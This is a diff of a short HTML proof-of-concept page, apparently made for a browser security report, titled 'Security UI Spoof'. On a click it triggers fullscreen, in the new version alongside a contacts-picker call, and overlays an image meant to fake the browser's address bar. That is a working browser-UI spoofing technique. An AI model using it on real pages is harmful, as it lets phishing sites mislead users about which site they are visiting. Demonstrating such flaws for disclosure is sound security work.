@@ -1,49 +1,38 @@
-<style>
-    select {
-        all: initial;
-
-
-    }
-
-    #front {
-        display: block;
-        top: 50vh;
-        left: 50vw;
-        position: fixed;
-
-    }
-
-    #spoofed {
-        display: none;
-        z-index: 1000;
-    }
-
-    * {
-        margin: 0;
-        overflow: hidden;
-
-    }
-</style>
-
-<div id="spoofed">
-    <img src="spof.png" class="header" style="width: 100vw;height: 100vh;" />
-</div>
-<center id="front">
-    <select onmousedown="requestPermission()">
-        <option>Click to spoof</option>
-
-    </select>
-</center>
-
-
-
-
-<script>
-    function requestPermission() {
-        var front = document.getElementById("front");
-        var spoofed = document.getElementById("spoofed");
-        document.documentElement.requestFullscreen();
-        spoofed.style.display = 'block';
-        front.style.opacity = "0";
-    }
-</script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    await navigator.contacts.select(["name"], {});
+                })();
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="spoof.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
+</html>
